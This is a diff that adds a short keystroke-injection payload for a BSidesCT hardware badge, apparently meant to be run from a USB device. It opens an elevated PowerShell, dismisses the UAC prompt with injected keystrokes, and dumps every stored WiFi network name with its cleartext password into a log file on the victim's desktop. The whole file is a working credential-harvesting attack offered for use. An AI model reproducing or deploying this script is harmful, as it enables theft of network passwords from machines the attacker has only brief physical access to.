@@ -1,0 +1,15 @@
+REM BSidesCT Badge WiFi Dumper - by illwill
+REM Dumps the stored WiFi SSID & Passwords from a windows machine.
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2500
+LEFT ARROW
+DELAY 500
+ENTER
+DELAY 2000
+STRING  (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-File $env:USERPROFILE\Desktop\Log.txt
+ENTER
+STRING EXIT
+ENTER
